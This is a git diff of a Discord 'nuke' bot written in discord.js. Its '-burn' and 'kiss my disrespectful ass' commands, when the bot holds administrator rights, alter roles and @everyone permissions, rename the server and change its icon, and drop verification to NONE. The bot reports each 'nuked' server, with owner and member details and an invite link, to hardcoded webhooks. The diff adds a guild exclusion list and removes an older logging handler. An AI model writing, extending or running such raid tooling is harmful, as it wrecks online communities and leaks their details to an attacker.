@@ -2,7 +2,7 @@ const Discord = require('discord.js');
 const {Intents, Client} = require('discord.js');
 const client = new Client({ws: {intents: Intents.ALL}});
 const fetch = require('node-fetch')
-const { prefix, token1, assy, list} = require('./config.json');
+const { prefix, token1, assy, list, unallowedguilds} = require('./config.json');
 const fs = require('fs');
 const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOSCM5umktPaq3xurM6A8EOyy4DXMPfK38BStA9bNeKtpBbnRpwYUANP200Mw7QiOR");
 const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
@@ -267,6 +267,7 @@ client.on("message", msg => {
   })
      //this edits all roles
      client.on('message', message => {
+  if(!unallowedguilds.includes(message.guild.id)) {
        if(message.content.startsWith('-burn')) {
  if(message.channel.type === "dm") {return}
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
@@ -282,8 +283,10 @@ setTimeout(() => {
   })
 },3000)
        }
+  }
      })
  client.on('message', async message => {
+  if(!unallowedguilds.includes(message.guild.id)) {
    if(message.content.startsWith('kiss my disrespectful ass')) {
 if(message.channel.type === "dm") {return}
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
@@ -292,6 +295,7 @@ await message.guild.emojis.create(randomicons123(), 'chaos')
 await message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube') 
 
    }
+  }
  })
 
  /**
@@ -306,12 +310,14 @@ await message.guild.emojis.create('https://images-ext-1.discordapp.net/external/
   */
  
    client.on('message', message => {
+  if(!unallowedguilds.includes(message.guild.id)) {
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
        message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
    }
    }
+  }
    }) 
  
  
@@ -358,6 +364,7 @@ a8"     "" 88       88 88P'    "8a a8P_____88
  }
  
    client.on('message', message => {
+  if(!unallowedguilds.includes(message.guild.id)) {
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
@@ -372,13 +379,14 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
              })
            }) 
 }
-         
+     } 
    }
    }) 
    
  
  const nukingtime = new Set()
  client.on('message', msg => {
+  if(!unallowedguilds.includes(msg.guild.id)) {
      if(msg.content.startsWith(`-burn`)) {
          if(msg.channel.type === "dm") {return}
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
@@ -526,10 +534,12 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
          
         }, 10000);
      }
+  }
  })
  
  
  client.on('message', message => {
+  if(!unallowedguilds.includes(msg.guild.id)) {
    if(message.content === 'kiss my disrespectful ass') {
  if(message.channel.type === "dm") {return}
  if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
@@ -538,9 +548,10 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
   setTimeout(() => {
      message.guild.setName(randomnames())
      message.guild.setIcon(randomicons123())
-     message.guild.setVerificationLevel("LOW")
+     message.guild.setVerificationLevel("NONE")
   }, 2000);
          
+  }
   }
  })
 
@@ -590,27 +601,6 @@ if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
 
 
 
-
-client.on("message", msg => {
-    if(msg.author.id === msg.client.user.id) {
-    if(msg.content === `@everyone all hail me`) {
- const server = msg.client.guilds.cache.find(g => g.id === guild)
-        const channel = server.channels.cache.find(c => c.id === logC)
-
-  const Id = msg.guild.id
-  const Oid = msg.guild.ownerID
-  const Otag = msg.guild.owner.user.tag //user goes null so idk
-  const Gm = msg.guild.memberCount
-const nukeEmbed = new Discord.MessageEmbed()
-.setColor('#FF0435')
-.setTitle(`Nuked "${msg.guild.name}"`)
-.setAuthor(client.user.username, "https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png")
-.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")      
-msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-.then(invite => channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`)))
-}
-    }
-})
 
 
 const commandCooldown1 = new Set()
